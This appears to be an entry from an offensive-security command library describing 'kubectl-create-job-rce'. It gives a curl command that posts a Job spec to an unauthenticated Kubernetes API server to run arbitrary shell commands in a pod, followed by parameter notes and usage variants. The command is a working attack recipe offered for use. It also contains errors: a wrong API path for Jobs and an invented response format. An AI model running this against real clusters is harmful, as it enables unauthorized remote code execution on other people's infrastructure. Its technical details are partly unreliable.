---
data: >-
  curl -k -X POST https://<target-ip>:6443/api/v1/namespaces/default/jobs -H
  "Content-Type: application/json" -d
  '{"apiVersion":"batch/v1","kind":"Job","metadata":{"name":"rce-job"},"spec":{"template":{"spec":{"containers":[{"name":"rce","image":"busybox","command":["sh","-c","id
  > /tmp/output"]}],"restartPolicy":"Never"}},"backoffLimit":0}}'
tags:
  - rce
  - kubernetes
type: command
output: '{"kind":"Job","metadata":{"name":"rce-job"}}'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.627Z'
id: c2063b81-2e9e-4bc5-999c-fad844eda6de
verified: false
validated: true
submitted: true
---
# kubectl-create-job-rce

## Command

```bash
curl -k -X POST https://<target-ip>:6443/api/v1/namespaces/default/jobs -H "Content-Type: application/json" -d '{"apiVersion":"batch/v1","kind":"Job","metadata":{"name":"rce-job"},"spec":{"template":{"spec":{"containers":[{"name":"rce","image":"busybox","command":["sh","-c","id > /tmp/output"]}],"restartPolicy":"Never"}},"backoffLimit":0}}'
```

## Description

Creates a Kubernetes job via direct API call to execute arbitrary shell commands in a pod, enabling RCE. Adapted from kubectl create job for unauthenticated access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-k` | Skip SSL verification | Yes |
| `-X POST` | HTTP method | Yes |
| `-H "Content-Type: application/json"` | Set JSON header | Yes |
| `-d '...'` | Job spec JSON payload | Yes |

## Examples

### Basic Usage

```bash
curl -k -X POST https://<target-ip>:6443/api/v1/namespaces/default/jobs -H "Content-Type: application/json" -d '{...basic job spec...}'
```

### Advanced Usage

```bash
curl -k -X POST https://<target-ip>:6443/api/v1/namespaces/default/jobs -H "Content-Type: application/json" -d '{...with custom command...}'
```

## Expected Output

JSON confirmation of job creation, e.g., {"kind":"Job","status":"created"}.

## Related

- [[commands/curl-kubernetes-api-probe]]
- [[procedures/Execute-Arbitrary-Code-as-Cluster-Admin]]
